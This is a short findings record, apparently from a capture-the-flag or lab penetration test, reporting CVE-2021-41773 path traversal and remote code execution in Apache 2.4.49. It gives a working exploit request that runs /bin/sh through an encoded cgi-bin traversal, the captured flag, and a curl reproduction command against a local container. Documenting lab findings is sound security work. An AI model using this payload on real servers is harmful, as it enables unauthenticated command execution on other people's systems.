findings.title: CVE-2021-41773 Apache 2.4.49 Path Traversal + RCE — CTF Flag Extracted
findings.description: Apache HTTP Server 2.4.49 is vulnerable to CVE-2021-41773, a path traversal and remote code execution vulnerability. The CGI module (mod_cgi) is enabled and allows execution of arbitrary commands via a crafted POST request to /cgi-bin/ with URL-encoded path traversal sequences (%2e). An unauthenticated attacker can execute arbitrary OS commands as the web server user.
findings.evidence:
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh with body 'echo Content-Type: text/plain; echo; cat /tmp/flag' returned:

flag{522200b1-5603-4ffd-bbdd-0b6a1db6cb2c}

reproduction.command: curl --path-as-is -X POST 'http://172.17.0.1:35771/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo Content-Type: text/plain; echo; cat /tmp/flag'
